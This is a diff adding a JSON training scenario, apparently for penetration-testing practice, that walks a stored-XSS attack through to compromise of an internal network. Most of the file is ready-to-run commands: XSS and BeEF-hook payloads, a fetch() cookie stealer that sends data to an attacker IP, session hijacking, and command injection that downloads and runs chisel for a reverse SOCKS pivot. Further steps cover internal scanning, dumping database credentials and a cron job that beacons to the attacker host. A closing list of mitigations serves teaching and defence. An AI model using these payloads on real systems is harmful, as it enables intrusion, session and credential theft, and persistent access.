@@ -1,0 +1,167 @@
+{
+  "title": "Stored XSS to Internal Network Compromise",
+  "description": "Advanced attack chain leveraging stored XSS for session hijacking, admin access, and pivoting to internal network infrastructure",
+  "difficulty": "advanced",
+  "estimated_time": "60 minutes",
+  "tools_used": [
+    "burp",
+    "curl",
+    "BeEF",
+    "proxychains",
+    "nmap"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "Reflected XSS Discovery",
+      "command": "curl 'http://blog.target.com/search.php?q=<script>alert(1)</script>' | grep '<script>alert(1)</script>'",
+      "explanation": "Test search functionality for reflected XSS by injecting JavaScript payload",
+      "expected_output": "Search query reflected in HTML without encoding: <h1>Results for: <script>alert(1)</script></h1>",
+      "success_criteria": "JavaScript payload reflected unescaped in response"
+    },
+    {
+      "step": 2,
+      "title": "Stored XSS Vulnerability Hunt",
+      "command": "curl -X POST http://blog.target.com/comment.php -d 'name=Tester&email=test@test.com&comment=<img src=x onerror=alert(1)>&post_id=5'",
+      "explanation": "Test comment submission for stored XSS using img tag with onerror event",
+      "expected_output": "Comment accepted, stored in database, will trigger on every page view",
+      "success_criteria": "Payload stored and executed when viewing post"
+    },
+    {
+      "step": 3,
+      "title": "BeEF Hook Deployment",
+      "command": "curl -X POST http://blog.target.com/comment.php -d 'name=User&email=user@test.com&comment=<script src=\"http://10.10.14.50:3000/hook.js\"></script>&post_id=5'",
+      "explanation": "Inject BeEF (Browser Exploitation Framework) hook via stored XSS to gain browser control",
+      "expected_output": "BeEF hook stored, executes in all visitors' browsers including administrators",
+      "success_criteria": "BeEF panel shows hooked browsers"
+    },
+    {
+      "step": 4,
+      "title": "Admin Session Monitoring",
+      "command": "# In BeEF panel: Monitor hooked browsers and wait for admin user",
+      "explanation": "Wait for administrator to view the compromised page, hooking their browser session",
+      "expected_output": "Admin user 'john.admin' hooked: IP 192.168.1.100, Chrome 120.0, authenticated session",
+      "success_criteria": "Administrator browser hooked with active session"
+    },
+    {
+      "step": 5,
+      "title": "Cookie Theft via Stored XSS",
+      "command": "curl -X POST http://blog.target.com/comment.php -d 'name=User2&comment=<img src=x onerror=\"fetch(\\\"http://10.10.14.50:8000/steal?c=\\\"+document.cookie)\">&post_id=5'",
+      "explanation": "Deploy cookie stealer payload to capture admin session cookies when they view comments",
+      "expected_output": "Admin cookies captured: PHPSESSID=abc123...; admin_token=eyJhbGci...; user_role=administrator",
+      "success_criteria": "Admin session cookie obtained"
+    },
+    {
+      "step": 6,
+      "title": "Session Hijacking",
+      "command": "curl -b 'PHPSESSID=abc123def456; admin_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; user_role=administrator' http://blog.target.com/admin/dashboard.php",
+      "explanation": "Use stolen cookies to impersonate admin and access administrative panel",
+      "expected_output": "Admin dashboard accessed: Server Management, User Control, System Settings, File Manager",
+      "success_criteria": "Full admin panel access with hijacked session"
+    },
+    {
+      "step": 7,
+      "title": "Admin Panel Reconnaissance",
+      "command": "curl -b cookies.txt http://blog.target.com/admin/system-info.php",
+      "explanation": "Enumerate admin panel to discover internal network information and server details",
+      "expected_output": "Server: Ubuntu 22.04, Internal IP: 10.10.10.50, Gateway: 10.10.10.1, DNS: 10.10.10.5",
+      "success_criteria": "Internal network topology discovered"
+    },
+    {
+      "step": 8,
+      "title": "Command Injection in Admin Tools",
+      "command": "curl -b cookies.txt -X POST http://blog.target.com/admin/tools/network-diagnostic.php -d 'host=127.0.0.1;id'",
+      "explanation": "Test admin diagnostic tools for command injection vulnerabilities",
+      "expected_output": "Ping output + command injection result: uid=33(www-data) gid=33(www-data)",
+      "success_criteria": "Command injection confirmed in admin tools"
+    },
+    {
+      "step": 9,
+      "title": "Internal Network Enumeration",
+      "command": "curl -b cookies.txt -X POST http://blog.target.com/admin/tools/network-diagnostic.php -d 'host=127.0.0.1;ip a'",
+      "explanation": "Enumerate all network interfaces to identify internal networks and VLANs",
+      "expected_output": "Interfaces: eth0 (192.168.1.100), eth1 (10.10.10.50/24 internal), docker0 (172.17.0.1/16)",
+      "success_criteria": "Multiple network interfaces identified"
+    },
+    {
+      "step": 10,
+      "title": "Deploy SOCKS Proxy for Pivoting",
+      "command": "curl -b cookies.txt -X POST http://blog.target.com/admin/tools/network-diagnostic.php -d 'host=127.0.0.1;curl http://10.10.14.50/chisel -o /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.50:8080 R:socks &'",
+      "explanation": "Upload and execute chisel for SOCKS proxy to pivot into internal 10.10.10.0/24 network",
+      "expected_output": "Chisel connected, SOCKS proxy established on attacker:1080",
+      "success_criteria": "SOCKS proxy operational for internal network access"
+    },
+    {
+      "step": 11,
+      "title": "Internal Network Scan via Pivot",
+      "command": "proxychains nmap -sT -Pn -p 22,80,443,3306,3389,5432 10.10.10.0/24",
+      "explanation": "Scan internal network through SOCKS proxy to discover additional targets",
+      "expected_output": "5 hosts discovered: DC (10.10.10.1), Database (10.10.10.5), File Server (10.10.10.10), Backup (10.10.10.15)",
+      "success_criteria": "Internal hosts and services enumerated"
+    },
+    {
+      "step": 12,
+      "title": "Database Server Access Attempt",
+      "command": "proxychains mysql -h 10.10.10.5 -u root -p",
+      "explanation": "Attempt database access using common credentials through pivot",
+      "expected_output": "MySQL connection successful with default root password (empty or 'root')",
+      "success_criteria": "Database access obtained"
+    },
+    {
+      "step": 13,
+      "title": "Credential Harvesting from Database",
+      "command": "proxychains mysql -h 10.10.10.5 -u root -e 'SELECT username,password,email FROM blog_db.users WHERE role=\"admin\"'",
+      "explanation": "Extract admin credentials from central database server",
+      "expected_output": "5 admin accounts extracted with bcrypt hashes, email addresses for password reset attacks",
+      "success_criteria": "Admin credentials harvested from database"
+    },
+    {
+      "step": 14,
+      "title": "Windows Domain Controller Identification",
+      "command": "proxychains nmap -sV -p 88,389,445,3389 10.10.10.1",
+      "explanation": "Identify Windows Domain Controller via Kerberos (88) and LDAP (389) services",
+      "expected_output": "Host: DC01.corp.local, Services: Kerberos, LDAP, SMB, RDP - Windows Server 2019 Domain Controller",
+      "success_criteria": "Domain Controller identified for future AD attacks"
+    },
+    {
+      "step": 15,
+      "title": "Persistence via Cron Job",
+      "command": "curl -b cookies.txt -X POST http://blog.target.com/admin/tools/network-diagnostic.php -d 'host=127.0.0.1;(crontab -l 2>/dev/null; echo \"*/10 * * * * curl http://10.10.14.50:8000/beacon?host=$(hostname)\") | crontab -'",
+      "explanation": "Establish persistence via cron job that beacons every 10 minutes for session re-establishment",
+      "expected_output": "Cron job added, beacons every 10 minutes with hostname and IP",
+      "success_criteria": "Persistent callback established"
+    }
+  ],
+  "learning_objectives": [
+    "Identifying and exploiting stored XSS vulnerabilities for persistent attacks",
+    "Browser exploitation using BeEF framework for advanced client-side attacks",
+    "Session hijacking techniques via cookie theft",
+    "Leveraging admin panel access for further exploitation",
+    "Command injection in privileged contexts for system compromise",
+    "Network pivoting using SOCKS proxies for internal network access",
+    "Post-exploitation enumeration of multi-tier network architectures",
+    "Lateral movement techniques across network segments",
+    "Persistence mechanisms in Linux environments"
+  ],
+  "mitigation": [
+    "Implement Content Security Policy (CSP) to prevent inline script execution",
+    "HTML entity encode all user input in output (XSS prevention)",
+    "Use HttpOnly and Secure flags on all session cookies",
+    "Implement SameSite cookie attribute to prevent CSRF and session theft",
+    "Strong session management with short timeouts and re-authentication for sensitive actions",
+    "Network segmentation to limit lateral movement",
+    "Implement zero-trust architecture with micro-segmentation",
+    "Input validation and sanitization for all admin tools",
+    "Monitor for unexpected outbound connections and SOCKS proxies",
+    "Implement file integrity monitoring for cron jobs and scheduled tasks"
+  ],
+  "tags": [
+    "xss",
+    "stored_xss",
+    "session_hijacking",
+    "beef",
+    "pivoting",
+    "lateral_movement",
+    "network_segmentation"
+  ]
+}
